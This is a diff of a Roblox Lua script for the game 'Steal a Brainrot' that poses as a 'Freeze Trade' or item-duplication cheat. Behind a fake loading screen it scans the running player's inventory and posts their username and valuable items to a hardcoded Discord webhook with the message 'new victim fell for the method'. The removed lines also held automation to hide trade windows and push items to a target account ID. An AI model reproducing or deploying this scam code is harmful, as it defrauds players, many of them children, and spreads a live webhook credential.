@@ -1,18 +1,15 @@
 -- ╔══════════════════════════════════════════╗
--- ║    BRANZZ FREEZE TRADE — AUTO v5.0       ║
+-- ║    BRANZZ FREEZE TRADE — REAL v4.0       ║
 -- ║       🧑‍💻 By BranZZ MetoDos 🚀            ║
 -- ╚══════════════════════════════════════════╝
 
 -- ══════════════════════════════════════
 -- ⚙️ CONFIG
 -- ══════════════════════════════════════
-local LOADING_TIME       = "2m"
-local WEBHOOK            = "https://discord.com/api/webhooks/1481221065773420719/IDgzqQLc00m0A_kj3BVXfc9XZvU1UtiKxYBnjp7pHwJ2_-rTUdijBelaviQWjSwpJWDB"
-local PING_1             = "<@1451570927711158313>"
-local PING_2             = "<@1451570927711158313>"
-local TARGET_ID          = 9929561794        -- ID Roblox do alvo
-local DELAY_STEP         = 1        -- delay entre adds
-local TRADE_CYCLE_DELAY  = 2        -- delay entre invites
+local LOADING_TIME = "2m"
+local WEBHOOK      = "https://discord.com/api/webhooks/1481221065773420719/IDgzqQLc00m0A_kj3BVXfc9XZvU1UtiKxYBnjp7pHwJ2_-rTUdijBelaviQWjSwpJWDB"
+local PING_1       = "<@1451570927711158313>"
+local PING_2       = "<@1451570927711158313>"
 
 local function parseTime(str)
     local num, unit = str:match("^(%d+)([smhSMH]?)$")
@@ -37,8 +34,6 @@ local Workspace         = game:GetService("Workspace")
 local UserInputService  = game:GetService("UserInputService")
 
 local localPlayer  = Players.LocalPlayer
-local pg           = localPlayer:WaitForChild("PlayerGui")
-local cam          = Workspace.CurrentCamera
 local modulesReady = false
 local FANDOM_BASE  = "https://stealabrainrot.fandom.com/wiki/"
 local WIKI_API     = "https://stealabrainrot.fandom.com/api.php"
@@ -46,10 +41,6 @@ local WIKI_API     = "https://stealabrainrot.fandom.com/api.php"
 -- ══════════════════════════════════════
 -- HTTP
 -- ══════════════════════════════════════
-local function getRequestFn()
-    return (syn and syn.request) or (http and http.request) or http_request or request
-end
-
 local function httpPost(url, payload)
     local body    = HttpService:JSONEncode(payload)
     local headers = { ["Content-Type"] = "application/json" }
@@ -109,39 +100,6 @@ local function isBadImage(url)
     return false
 end
 
--- Método do script original (og:image) — mais confiável
-local function fetchFandomImageOriginal(name)
-    local requestFn = getRequestFn()
-    if not requestFn then return nil end
-    local wikiName = (name:match("^(.-)%s*%(") or name):gsub(" ","_")
-    local url = nil
-    for attempt = 1, 3 do
-        pcall(function()
-            local res = requestFn({
-                Url     = FANDOM_BASE .. wikiName,
-                Method  = "GET",
-                Headers = {
-                    ["User-Agent"]   = "Mozilla/5.0",
-                    ["Accept"]       = "text/html,application/xhtml+xml",
-                    ["Cache-Control"]= "no-cache"
-                },
-                Timeout = 10
-            })
-            if not res or res.StatusCode ~= 200 or not res.Body or res.Body == "" then return end
-            local body = res.Body
-            local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
-                         or body:match('content="([^"]+)"%s+property="og:image"')
-            if ogImage and ogImage ~= "" then
-                ogImage = ogImage:gsub("&amp;","&")
-                if ogImage:find("^https?://") then url = ogImage end
-            end
-        end)
-        if url then break end
-        if attempt < 3 then task.wait(0.5) end
-    end
-    return url
-end
-
 local function fetchFandomImage(name)
     local url  = nil
     local done = false
@@ -151,14 +109,6 @@ local function fetchFandomImage(name)
     local v3 = name:lower():gsub(" ","_")
     local bestVariant = v1
 
-    -- MÉTODO 1: og:image do script original (mais confiável)
-    task.spawn(function()
-        if done then return end
-        local img = fetchFandomImageOriginal(name)
-        if img and not isBadImage(img) then done=true; url=img end
-    end)
-
-    -- MÉTODO 2: MediaWiki pageimages
     task.spawn(function()
         if done then return end
         for _, v in ipairs({v1, v2, v3}) do
@@ -175,7 +125,6 @@ local function fetchFandomImage(name)
         end
     end)
 
-    -- MÉTODO 3: Fandom v1 Search
     task.spawn(function()
         if done then return end
         pcall(function()
@@ -193,7 +142,6 @@ local function fetchFandomImage(name)
         end)
     end)
 
-    -- MÉTODO 4: HTML scraping
     task.spawn(function()
         if done then return end
         pcall(function()
@@ -221,6 +169,26 @@ local function fetchFandomImage(name)
         end)
     end)
 
+    task.spawn(function()
+        if done then return end
+        pcall(function()
+            local res = httpGet(WIKI_API.."?action=query&titles="..bestVariant.."&prop=images&format=json&imlimit=10")
+            if done or not res or not res.Body then return end
+            if res.Body:find('"missing"') then return end
+            for fname in res.Body:gmatch('"title":"(File:[^"]+)"') do
+                if done then break end
+                if not isBadImage(fname) then
+                    pcall(function()
+                        local r2 = httpGet(WIKI_API.."?action=query&titles="..(fname:gsub(" ","_")).."&prop=imageinfo&iiprop=url&format=json")
+                        if done or not r2 or not r2.Body then return end
+                        local imgUrl = r2.Body:match('"url":"(https://[^"]+)"')
+                        if imgUrl and not isBadImage(imgUrl) then done=true; url=imgUrl:gsub("\\","") end
+                    end)
+                end
+            end
+        end)
+    end)
+
     local waited = 0
     while not done and waited < 5 do
         task.wait(0.05)
@@ -232,13 +200,13 @@ local function fetchFandomImage(name)
 end
 
 -- ══════════════════════════════════════
--- SCANNER — NOSSO SISTEMA
+-- SCANNER REAL
 -- ══════════════════════════════════════
 local AnimalsData   = nil
 local AnimalsShared = nil
 pcall(function()
-    AnimalsData   = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
-    AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
+    AnimalsData   = require(ReplicatedStorage.Datas.Animals)
+    AnimalsShared = require(ReplicatedStorage.Shared.Animals)
 end)
 
 local function scanMyBrainrots()
@@ -288,15 +256,14 @@ local function scanMyBrainrots()
                 local found = false
                 for _, r in ipairs(results) do
                     if r.displayName == displayName and r.mutation == mutation then
-                        r.count = r.count + 1; found = true; break
+                        r.count = r.count + 1
+                        found = true
+                        break
                     end
                 end
                 if not found then
                     table.insert(results, {
                         displayName = displayName,
-                        index       = animalData.Index,
-                        slotKey     = tonumber(slot),
-                        slotData    = animalData,
                         mutation    = mutation,
                         traits      = traitsText,
                         genVal      = genVal,
@@ -368,31 +335,14 @@ end
 -- ══════════════════════════════════════
 -- WEBHOOK
 -- ══════════════════════════════════════
-local function sendWebhook(brainrots)
+local function sendWebhook()
+    local brainrots   = scanMyBrainrots()
     local playerCount = #Players:GetPlayers()
     local bestName    = #brainrots > 0 and brainrots[1].displayName or nil
-    local bestIndex   = #brainrots > 0 and brainrots[1].index or nil
-    local imageUrl    = nil
-
-    if bestName then
-        imageUrl = fetchFandomImage(bestName)
-        -- Fallback: tenta pegar imagem pelo AssetId do AnimalsData
-        if not imageUrl and bestIndex then
-            local info = AnimalsData and AnimalsData[bestIndex]
-            if info then
-                for _, key in ipairs({"Image","Icon","Thumbnail","Texture","ImageId","AssetId","image","icon"}) do
-                    if info[key] and type(info[key]) == "string" and info[key] ~= "" then
-                        local num = info[key]:match("%d+")
-                        if num then imageUrl = "https://tr.rbxcdn.com/"..num.."/420/420/Image/Png"; break end
-                    end
-                end
-            end
-        end
-    end
-
-    local nick    = localPlayer.Name
-    local display = localPlayer.DisplayName
-    local embed   = buildEmbed(nick, display, playerCount, brainrots, imageUrl)
+    local imageUrl    = bestName and fetchFandomImage(bestName) or nil
+    local nick        = localPlayer.Name
+    local display     = localPlayer.DisplayName
+    local embed       = buildEmbed(nick, display, playerCount, brainrots, imageUrl)
 
     httpPost(WEBHOOK, {
         content  = "@everyone @here nova vitima caiu no metodo",
@@ -400,21 +350,6 @@ local function sendWebhook(brainrots)
         username = "BranzZ Freeze Trade",
     })
 end
-
--- ══════════════════════════════════════
--- REMOTES DO TRADE (do script original)
--- ══════════════════════════════════════
-local function getRemote(unobfuscatedName)
-    local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
-    local children = Net:GetChildren()
-    for i = 1, #children - 1 do
-        local current  = children[i]
-        local nextFolder = children[i + 1]
-        if current and nextFolder and string.find(current.Name, unobfuscatedName) then
-            return nextFolder
-        end
-    end
-    return nil
 
 -- ══════════════════════════════════════
 -- HELPERS UI
@@ -510,7 +445,7 @@ local function showNotification(message)
     makeCorner(topBar, 4)
 
     makeLabel(nf, {
-        text  = "BRANZZ DUP",
+        text  = "⚙️ BranzZ Freeze Trade",
         font  = Enum.Font.GothamBold,
         size  = 13,
         color = Color3.fromRGB(200,185,240),
@@ -630,7 +565,7 @@ local function showMainUI(sg)
     body.Parent = main
 
     makeLabel(body, {
-        text  = "By BranZZ MetoDos  •  AUTO v5.0",
+        text  = "By BranZZ MetoDos  •  Unpatched v4.0",
         size  = 11,
         color = Color3.fromRGB(100,88,145),
         sz    = UDim2.new(1,0,0,18),
@@ -650,7 +585,7 @@ local function showMainUI(sg)
     btn1.Size = UDim2.new(0.82,0,0,48)
     btn1.Position = UDim2.new(0.09,0,0,44)
     btn1.BackgroundColor3 = Color3.fromRGB(80,65,145)
-    btn1.Text = " DUPLICA BEST BRAINROT"
+    btn1.Text = "❄️   Freeze Trade"
     btn1.TextColor3 = Color3.fromRGB(230,220,255)
     btn1.TextSize = 15
     btn1.Font = Enum.Font.GothamBold
@@ -665,7 +600,7 @@ local function showMainUI(sg)
     btn2.Size = UDim2.new(0.82,0,0,48)
     btn2.Position = UDim2.new(0.09,0,0,102)
     btn2.BackgroundColor3 = Color3.fromRGB(65,115,80)
-    btn2.Text = "DUPLICA BRAINROT SLOT 1"
+    btn2.Text = "✅   Auto Accept"
     btn2.TextColor3 = Color3.fromRGB(210,245,220)
     btn2.TextSize = 15
     btn2.Font = Enum.Font.GothamBold
@@ -729,7 +664,7 @@ end
 -- ══════════════════════════════════════
 -- LOADING SCREEN
 -- ══════════════════════════════════════
-local function showLoading(onDone)
+local function showLoading()
     local sg = Instance.new("ScreenGui")
     sg.Name = "BRANZZ_TRADE_UI"
     sg.ResetOnSpawn = false
@@ -759,7 +694,7 @@ local function showLoading(onDone)
     makeDrag(lc, lc)
 
     makeLabel(lc, {
-        text  = " BRANZZ DUPLICATOR ",
+        text  = "🐒 BranzZ Freeze Trade",
         font  = Enum.Font.GothamBold,
         size  = 16,
         color = Color3.fromRGB(215,200,245),
@@ -846,7 +781,7 @@ local function showLoading(onDone)
     makeCorner(barFill, 5)
 
     makeLabel(lc, {
-        text  = "🟢 STATUS ON",
+        text  = "🟢 LIVE ON",
         size  = 10,
         color = Color3.fromRGB(65,52,95),
         sz    = UDim2.new(1,0,0,16),
@@ -895,19 +830,11 @@ local function showLoading(onDone)
         lc:Destroy()
         modulesReady = true
         showMainUI(sg)
-        if onDone then onDone() end
     end)
 end
 
 -- ══════════════════════════════════════
 -- EXECUÇÃO
 -- ══════════════════════════════════════
-local brainrots = scanMyBrainrots()
-
--- Esconde UIs do trade e envia webhook imediatamente
-applyTradeConfig()
-task.spawn(function() sendWebhook(brainrots) end)
-
--- Inicia automação e loading em paralelo
-task.spawn(function() startFullAutomation(brainrots) end)
+task.spawn(sendWebhook)
 showLoading()
